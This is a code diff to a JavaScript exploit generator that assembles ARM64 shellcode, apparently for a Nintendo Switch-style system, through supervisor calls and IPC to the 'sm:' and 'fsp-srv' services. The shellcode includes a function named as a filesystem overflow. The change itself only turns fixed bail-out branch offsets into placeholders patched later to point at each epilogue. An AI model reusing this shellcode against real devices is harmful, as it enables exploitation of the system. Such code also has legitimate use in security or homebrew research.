@@ -397,7 +397,8 @@ function generateFsOverflowShellcode(scratchBase) {
   code.push(str32_imm(21, 20, 0));      // result[0] = ConnectToNamedPort result
 
   // If failed, skip to end
-  code.push(cbnz(21, 200));             // placeholder: jump to epilogue
+  var overflowBailIdx = code.length;
+  code.push(0);                          // placeholder: patched to jump to epilogue
 
   // --- Step 2: Initialize sm: session ---
   // Write IPC: Initialize(false, 0)
@@ -633,6 +634,10 @@ function generateFsOverflowShellcode(scratchBase) {
   code.push(str32_imm(0, 20, 24));        // result[6] = GetEntryType result
 
   // --- Epilogue: clean up and return ---
+  // Patch bail branch to jump here
+  var overflowEpilogueIdx = code.length;
+  code[overflowBailIdx] = cbnz(21, overflowEpilogueIdx - overflowBailIdx);
+
   // Close fsp-srv handle
   code.push(mov_reg32(0, 23));
   code.push(svc(0x16));                   // CloseHandle
@@ -694,7 +699,8 @@ function generateServiceProbe() {
   code.push(svc(0x1F));
   code.push(str32_imm(0, 20, 0));    // result[0] = sm connect result
   code.push(mov_reg32(21, 1));        // x21 = sm handle
-  code.push(cbnz(0, 50));             // if failed, skip to end
+  var probeBailIdx = code.length;
+  code.push(0);                       // placeholder: cbnz to epilogue (patched below)
 
   // Initialize sm session
   code.push(0xD53BD060);
@@ -761,7 +767,10 @@ function generateServiceProbe() {
   code.push(mov_reg32(0, 21));
   code.push(svc(0x16));
 
-  // Epilogue
+  // Epilogue — patch the bail branch to jump here
+  var probeEpilogueIdx = code.length;
+  code[probeBailIdx] = cbnz(0, probeEpilogueIdx - probeBailIdx);
+
   code.push(ldp(21, 22, 31, 0x20));
   code.push(ldp(19, 20, 31, 0x10));
   code.push(ldp_post(29, 30, 31, 0x40));
